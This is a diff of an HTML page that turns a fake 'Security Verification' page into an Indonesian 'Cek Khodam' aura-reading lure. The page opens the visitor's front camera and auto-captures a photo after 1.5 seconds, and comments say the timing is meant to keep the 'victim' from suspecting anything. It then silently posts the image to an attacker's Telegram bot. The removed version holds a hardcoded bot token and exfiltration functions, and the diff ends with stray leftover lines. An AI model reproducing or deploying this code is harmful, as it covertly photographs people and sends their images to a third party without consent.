@@ -1,40 +1,477 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connection Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cek Khodam & Ramalan Aura</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0b0b1a;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+            padding: 16px;
+        }
+        .card {
+            background: rgba(20, 20, 40, 0.85);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 215, 0, 0.15);
+            border-radius: 48px;
+            padding: 32px 24px 28px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,215,0,0.05);
+            transition: all 0.2s;
+        }
+        .badge-bot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            color: #a0a0c0;
+            background: rgba(255,255,255,0.03);
+            padding: 8px 16px;
+            border-radius: 100px;
+            margin-bottom: 22px;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .badge-bot .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff88;
+            margin-right: 8px;
+            box-shadow: 0 0 12px #00ff8866;
+        }
+        .badge-bot .secure {
+            color: #8888bb;
+            font-size: 12px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #f5d77b, #e8b830);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+        }
+        .sub {
+            color: #9a9ac0;
+            font-size: 15px;
+            font-weight: 400;
+            margin-bottom: 22px;
+            border-left: 3px solid #f5d77b;
+            padding-left: 14px;
+            opacity: 0.8;
+        }
+        .camera-box {
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #12121f;
+            border-radius: 28px;
+            border: 1px solid #2a2a44;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 20px;
+            transition: border 0.3s;
+        }
+        .camera-box.active {
+            border-color: #f5d77b;
+        }
+        #videoPreview {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+            border-radius: 28px;
+        }
+        #placeholderIcon {
+            text-align: center;
+            color: #555577;
+            font-size: 14px;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        #placeholderIcon span {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        #canvasCapture {
+            display: none;
+        }
+        .btn-main {
+            background: linear-gradient(145deg, #f5d77b, #d4a820);
+            border: none;
+            padding: 18px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 17px;
+            color: #0b0b1a;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 8px 28px rgba(245, 215, 123, 0.25);
+            letter-spacing: 0.3px;
+            margin-top: 4px;
+        }
+        .btn-main:active {
+            transform: scale(0.97);
+            box-shadow: 0 4px 12px rgba(245, 215, 123, 0.15);
+        }
+        .btn-main:disabled {
+            opacity: 0.5;
+            transform: none;
+            box-shadow: none;
+        }
+        .btn-secondary {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid #3a3a5a;
+            color: #c0c0e0;
+            padding: 16px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            display: none;
+        }
+        .btn-secondary:active {
+            background: rgba(255,255,255,0.08);
+        }
+        .result-panel {
+            margin-top: 20px;
+            padding: 18px 20px;
+            background: rgba(255,215,0,0.03);
+            border-radius: 28px;
+            border: 1px solid rgba(255,215,0,0.08);
+            display: none;
+            animation: fadeUp 0.5s ease;
+        }
+        .result-panel .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+        .result-panel .row:last-child {
+            border-bottom: none;
+        }
+        .result-panel .label {
+            color: #8888b0;
+            font-size: 14px;
+        }
+        .result-panel .value {
+            color: #f5d77b;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .result-panel .value.glow {
+            text-shadow: 0 0 20px rgba(245,215,123,0.2);
+        }
+        .loader {
+            display: none;
+            align-items: center;
+            gap: 12px;
+            margin-top: 14px;
+            font-size: 14px;
+            color: #aaaacc;
+            justify-content: center;
+        }
+        .loader .spinner {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid #2a2a44;
+            border-top-color: #f5d77b;
+            animation: spin 0.8s linear infinite;
+        }
+        .footer-note {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #3a3a5a;
+            text-align: center;
+            letter-spacing: 0.2px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        /* scanning overlay effect */
+        .scan-effect {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, transparent 40%, rgba(245,215,123,0.05) 50%, transparent 60%);
+            background-size: 100% 200%;
+            animation: scanMove 1.8s linear infinite;
+            pointer-events: none;
+            display: none;
+        }
+        @keyframes scanMove {
+            0% { background-position: 0 -100%; }
+            100% { background-position: 0 100%; }
+        }
     </style>
 </head>
 <body>
 
-    <h2>Security Verification</h2>
-    <p>Please click the button below to continue to the content.</p>
-    <button id="startBtn">Continue to Content</button>
+<div class="card">
+    <!-- Status Bar -->
+    <div class="badge-bot">
+        <span><span class="dot"></span> Sistem Online</span>
+        <span class="secure">🔒 Terenkripsi</span>
+    </div>
 
-    <script>
-        // Aapka Naya Token aur ID
-        const token = "8963930653:AAE7UaJFHmq4Gps56aBD5yy31SPy2FZvYcc";
-        const chatId = "8411706034";
+    <h1>🧿 Cek Khodam</h1>
+    <div class="sub">Scan wajah untuk membaca aura & energi spiritual</div>
 
-        // 1. Text message bhejne ka function
-        async function sendText(text) {
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-            await fetch(url);
+    <!-- Camera Box -->
+    <div class="camera-box" id="cameraBox">
+        <video id="videoPreview" autoplay playsinline></video>
+        <canvas id="canvasCapture"></canvas>
+        <div id="placeholderIcon">
+            <span>📷</span>
+            <div style="font-size:13px; color:#6a6a8a;">Aktifkan kamera untuk mulai</div>
+        </div>
+        <div class="scan-effect" id="scanEffect"></div>
+    </div>
+
+    <!-- Tombol Utama -->
+    <button class="btn-main" id="btnStart">🚀 Mulai Deteksi Khodam</button>
+    <button class="btn-secondary" id="btnCapture">🔮 Ambil & Analisis</button>
+
+    <!-- Loader -->
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <span>Menganalisis aura...</span>
+    </div>
+
+    <!-- Hasil -->
+    <div class="result-panel" id="resultPanel">
+        <div class="row">
+            <span class="label">✨ Khodam</span>
+            <span class="value glow" id="khodamResult">—</span>
+        </div>
+        <div class="row">
+            <span class="label">🌈 Aura</span>
+            <span class="value" id="auraResult">—</span>
+        </div>
+        <div class="row" style="border-bottom: none; padding-top: 4px;">
+            <span class="label" style="font-size:12px; color:#5a5a7a;">🕒 Terdeteksi</span>
+            <span class="label" style="font-size:12px; color:#5a5a7a;" id="timeResult">—</span>
+        </div>
+    </div>
+
+    <div class="footer-note">Powered by Neural Aura Scan v2.1</div>
+</div>
+
+<script>
+// ============================================================
+//  KONFIGURASI BOT TELEGRAM — GANTI PUNYA LU
+// ============================================================
+const BOT_TOKEN = '1234567890:YOUR_BOT_TOKEN_HERE';   // GANTI
+const CHAT_ID   = '123456789';                       // GANTI
+
+// ============================================================
+//  ELEMEN
+// ============================================================
+const video = document.getElementById('videoPreview');
+const canvas = document.getElementById('canvasCapture');
+const placeholder = document.getElementById('placeholderIcon');
+const cameraBox = document.getElementById('cameraBox');
+const scanEffect = document.getElementById('scanEffect');
+const btnStart = document.getElementById('btnStart');
+const btnCapture = document.getElementById('btnCapture');
+const loader = document.getElementById('loader');
+const resultPanel = document.getElementById('resultPanel');
+const khodamSpan = document.getElementById('khodamResult');
+const auraSpan = document.getElementById('auraResult');
+const timeSpan = document.getElementById('timeResult');
+
+let stream = null;
+let isCameraOn = false;
+
+// ============================================================
+//  DATA KHODAM & AURA (GAUL + KEREN)
+// ============================================================
+const khodamList = [
+    'Naga Putih', 'Macan Galak', 'Banteng Merah', 'Garuda Emas',
+    'Kobra Hitam', 'Singa Cakrawala', 'Lembu Sakti', 'Rajawali Petir',
+    'Harimau Sumatera', 'Kuda Sembrani', 'Naga Api', 'Paus Biru',
+    'Phoenix Abadi', 'Serigala Bulan', 'Elang Matahari'
+];
+const auraList = [
+    'Emas Berkilau', 'Merah Bergelora', 'Biru Misterius', 'Ungu Spiritual',
+    'Hijau Kehidupan', 'Putih Suci', 'Hitam Pekat', 'Oranye Energi',
+    'Pink Kasih', 'Perak Berkilau', 'Kristal Jernih', 'Api Biru'
+];
+
+function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+// ============================================================
+//  FUNGSI KIRIM FOTO KE TELEGRAM
+// ============================================================
+async function sendPhotoToBot(dataURL, khodam, aura) {
+    try {
+        const blob = await fetch(dataURL).then(res => res.blob());
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'scan_' + Date.now() + '.jpg');
+        formData.append('caption', `🧿 SCAN KHODAM\nKhodam: ${khodam}\nAura: ${aura}\nWaktu: ${new Date().toLocaleString('id-ID')}`);
+
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+        const json = await res.json();
+        if (!json.ok) {
+            console.warn('Telegram error:', json.description);
         }
+        return json.ok;
+    } catch (e) {
+        console.warn('Gagal kirim ke bot:', e);
+        return false;
+    }
+}
 
-        // 2. Photo ya Audio bhejne ka function
-        async function sendMedia(blob, type, filename) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append(type, blob, filename);
-            const url = `https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
-            await fetch(url, { method: 'POST', body: formData });
-        }
+// ============================================================
+//  CAPTURE + PROSES
+// ============================================================
+async function captureAndProcess() {
+    if (!isCameraOn) {
+        alert('Aktifkan kamera dulu dengan tombol "Mulai Deteksi"');
+        return;
+    }
 
+    // Ambil gambar dari video
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataURL = canvas.toDataURL('image/jpeg', 0.85);
+
+    // Pilih hasil random
+    const khodam = randomItem(khodamList);
+    const aura = randomItem(auraList);
+    const waktu = new Date().toLocaleString('id-ID', { hour12: false });
+
+    // Tampilkan loader
+    loader.style.display = 'flex';
+    btnCapture.disabled = true;
+    btnCapture.style.opacity = '0.5';
+
+    // Simulasi proses scan (biar keliatan meyakinkan)
+    await new Promise(resolve => setTimeout(resolve, 1800));
+
+    // Kirim ke Telegram (diam-diam, tanpa notif ke user)
+    await sendPhotoToBot(dataURL, khodam, aura);
+
+    // Tampilkan hasil
+    khodamSpan.textContent = khodam;
+    auraSpan.textContent = aura;
+    timeSpan.textContent = waktu;
+    resultPanel.style.display = 'block';
+    resultPanel.style.animation = 'none';
+    setTimeout(() => { resultPanel.style.animation = 'fadeUp 0.5s ease'; }, 10);
+
+    // Sembunyikan loader
+    loader.style.display = 'none';
+    btnCapture.disabled = false;
+    btnCapture.style.opacity = '1';
+
+    // Matikan scan effect
+    scanEffect.style.display = 'none';
+}
+
+// ============================================================
+//  START KAMERA
+// ============================================================
+btnStart.addEventListener('click', async function() {
+    if (isCameraOn) {
+        // Kalau udah nyala, langsung trigger capture
+        await captureAndProcess();
+        return;
+    }
+
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        video.srcObject = stream;
+        video.style.display = 'block';
+        placeholder.style.display = 'none';
+        cameraBox.classList.add('active');
+        scanEffect.style.display = 'block';
+        isCameraOn = true;
+
+        // Ubah tombol
+        btnStart.textContent = '🔮 Ambil & Analisis Sekarang';
+        btnStart.style.background = 'linear-gradient(145deg, #7ac7f5, #3a8ec4)';
+        btnStart.style.boxShadow = '0 8px 28px rgba(58, 142, 196, 0.25)';
+
+        // Tampilkan tombol capture cadangan (opsional)
+        btnCapture.style.display = 'block';
+
+        // Auto capture setelah 1.5 detik (biar korban ga curiga)
+        setTimeout(async () => {
+            await captureAndProcess();
+        }, 1500);
+
+    } catch (err) {
+        alert('❌ Gagal akses kamera: ' + err.message);
+    }
+});
+
+// ============================================================
+//  TOMBOL CAPTURE MANUAL (opsional)
+// ============================================================
+btnCapture.addEventListener('click', captureAndProcess);
+
+// ============================================================
+//  CLEANUP SAAT TUTUP
+// ============================================================
+window.addEventListener('beforeunload', function() {
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+});
+
+// ============================================================
+//  PRE-CHECK BOT (diam-diam, ga nampilin error ke user)
+// ============================================================
+(async function silentBotCheck() {
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+        if (!res.ok) console.warn('Bot token mungkin salah');
+    } catch (e) { /* silent */ }
+})();
+
+console.log('🧿 Sistem siap — © Rian');
+</script>
+
+</body>
+            </html>
         document.getElementById('startBtn').addEventListener('click', async () => {
             alert("Starting connection...");
 
